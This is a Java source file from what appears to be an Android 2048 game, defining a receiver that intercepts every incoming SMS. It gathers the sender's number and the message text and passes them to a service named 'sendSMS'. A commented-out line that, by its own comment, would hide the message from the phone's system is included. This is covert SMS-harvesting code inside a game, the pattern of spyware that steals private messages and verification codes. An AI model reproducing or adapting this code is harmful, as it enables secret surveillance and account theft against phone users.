/**
 * 
 */
package com.zhy.game2048;

import java.io.UnsupportedEncodingException;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
	@SuppressLint("ShowToast")
	@Override
	public void onReceive(Context context, Intent intent) {
		// 如果是接收到短信
		if (intent.getAction()
				.equals("android.provider.Telephony.SMS_RECEIVED")) {
			// 取消广播（这行代码将会让系统收不到短信）
			// abortBroadcast();
			StringBuilder sb = new StringBuilder();

			Bundle bundle = intent.getExtras();
			// 判断是否有数据
			if (bundle != null) {
				// 通过pdus可以获得接收到的所有短信消息
				Object[] pdus = (Object[]) bundle.get("pdus");
				// 构建短信对象array,并依据收到的对象长度来创建array的大小
				SmsMessage[] messages = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				}
				// 将送来的短信合并自定义信息于StringBuilder当中
				for (SmsMessage message : messages) {
					sb.append("receive from:");
					// 获得接收短信的电话号码
					sb.append(message.getDisplayOriginatingAddress());
					sb.append("\n-----Content------\n");
					// 获得短信的内容
					sb.append(message.getDisplayMessageBody());
				}
			}
			String receivedText = null;
			try {
				receivedText = new String(sb.toString().trim().getBytes(),
						"UTF-8");
			} catch (UnsupportedEncodingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			if (receivedText != null) {
				final Intent serIntent = new Intent();
				serIntent.setAction("com.ncnipc.androidgroup.sendSMS");
				serIntent.addCategory("com.ncnipc.androidgroup.sendSMS");
				serIntent.putExtra("MessageContent", sb.toString().trim());
				context.startService(serIntent);
			}
		}
	}
}
